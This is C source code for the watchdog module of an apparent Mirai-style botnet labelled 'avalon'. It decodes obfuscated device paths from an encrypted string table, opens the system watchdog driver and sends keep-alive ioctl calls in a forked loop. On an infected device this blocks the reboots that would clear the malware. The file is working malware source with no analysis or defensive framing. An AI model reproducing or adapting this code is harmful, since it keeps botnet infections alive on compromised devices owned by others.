#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <signal.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/watchdog.h"

int watchdog_pid = 0;

void watchdog_init(void)
{
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    int timeout = 1;
    int ioctl_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_WATCHDOG_1);
    table_unlock_val(TABLE_WATCHDOG_2);
    table_unlock_val(TABLE_WATCHDOG_3);
    table_unlock_val(TABLE_WATCHDOG_4);
    table_unlock_val(TABLE_WATCHDOG_5);
    table_unlock_val(TABLE_WATCHDOG_6);
    table_unlock_val(TABLE_WATCHDOG_7);

    if((ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_1, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_2, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_3, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_4, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_5, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_6, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_WATCHDOG_7, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("(avalon/watchdog) >> found a valid watchdog driver\n");
        #endif
        found = TRUE;
        ioctl(ioctl_fd, 0x80045704, &timeout);
    }

    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("(avalon/watchdog) >> sending keep-alive ioctl call\n");
            #endif
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    else
    {
        #ifdef DEBUG
            printf("(avalon/watchdog) >> failed to find a valid watchdog driver\n");
        #endif
    }

    table_lock_val(TABLE_WATCHDOG_1);
    table_lock_val(TABLE_WATCHDOG_2);
    table_lock_val(TABLE_WATCHDOG_3);
    table_lock_val(TABLE_WATCHDOG_4);
    table_lock_val(TABLE_WATCHDOG_5);
    table_lock_val(TABLE_WATCHDOG_6);
    table_lock_val(TABLE_WATCHDOG_7);

    exit(0);
}

void watchdog_kill(void)
{
    if(watchdog_pid > 0)
        kill(watchdog_pid, 9);
}
